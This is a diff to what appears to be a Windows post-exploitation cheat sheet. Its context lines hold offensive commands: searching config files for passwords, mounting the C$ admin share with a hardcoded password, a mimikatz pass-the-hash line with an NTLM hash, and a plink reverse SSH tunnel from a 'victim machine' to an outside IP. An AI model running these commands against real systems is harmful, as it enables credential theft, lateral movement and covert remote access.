@@ -83,6 +83,9 @@ whoami /priv
 #Check user password policy
 net accounts
 
+#view shares
+net share
+
 #SEARCH FOR file contents
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
@@ -120,10 +123,7 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn
 #############################
 #### ACCESSING SMB SHARE ####
 #############################
-#view shares
-net share
-
-#mount share 
+#mount share (to list shares 'net share')
 NET USE Z: \\ComputerName\C$ SecretPassword /USER:alice
 
 #delete mapped share
@@ -275,7 +275,16 @@ sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893
 #reverse ssh from victim machine back to kali
 plink -l root -pw secretpassword 208.88.127.99 R 3390:127.0.0.1:3389
 
+#########################
+#### USEFUL COMMANDS ####
+#########################
 
+#Find listening ports
+netstat ano | FIND "LISTEN"
+
+#Kill processes
+tasklist | FIND "my process"
+taskkill /F /PID 1242
 
 
 
